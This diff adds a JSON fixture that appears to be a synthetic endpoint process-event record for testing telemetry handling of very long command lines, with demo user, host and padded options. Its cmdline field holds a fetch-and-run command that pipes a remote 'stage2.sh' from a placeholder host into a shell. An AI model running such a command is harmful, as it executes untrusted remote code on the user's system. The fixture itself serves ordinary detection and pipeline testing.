@@ -1,0 +1,24 @@
+{
+  "event_id": "e-proc-1",
+  "device_id": "6f1c2a8e-0b7d-4e44-9a51-3c2d7e9f0a11",
+  "feed": "process_events",
+  "observed_at": "2026-11-12T10:00:00Z",
+  "received_at": "2026-11-12T10:00:05.250Z",
+  "time_flag": "",
+  "columns": {
+    "pid": "20294",
+    "path": "/usr/bin/curl",
+    "cmdline": "bash -c 'curl -s https://www.example.com/stage2.sh | sh' --opt0=valor0 --opt1=valor1 --opt2=valor2 --opt3=valor3 --opt4=valor4 --opt5=valor5 --opt6=valor6 --opt7=valor7 --opt8=valor8 --opt9=valor9 --opt10=valor10 --opt11=valor11 --opt12=valor12 --opt13=valor13 --opt14=valor14 --opt15=valor15 --opt16=valor16 --opt17=valor17 --opt18=valor18 --opt19=valor19 --opt20=valor20 --opt21=valor21 --opt22=valor22 --opt23=valor23 --opt24=valor24 --opt25=valor25 --opt26=valor26 --opt27=valor27 --opt28=valor28 --opt29=valor29 --opt30=valor30 --opt31=valor31 --opt32=valor32 --opt33=valor33 --opt34=valor34 --opt35=valor35 --opt36=valor36 --opt37=valor37 --opt38=valor38 --opt39=valor39",
+    "uid": "1000",
+    "parent": "20200",
+    "eid": "77",
+    "syscall": "execve",
+    "process_guid": "1a2b3c4d:20294:555",
+    "parent_guid": "1a2b3c4d:20200:444",
+    "cwd": "/home/demo/projetos/um/caminho/longo",
+    "parent_path": "/usr/bin/bash",
+    "user": "demo"
+  },
+  "hostname": "srv-01.example.com",
+  "device_os": "linux"
+}
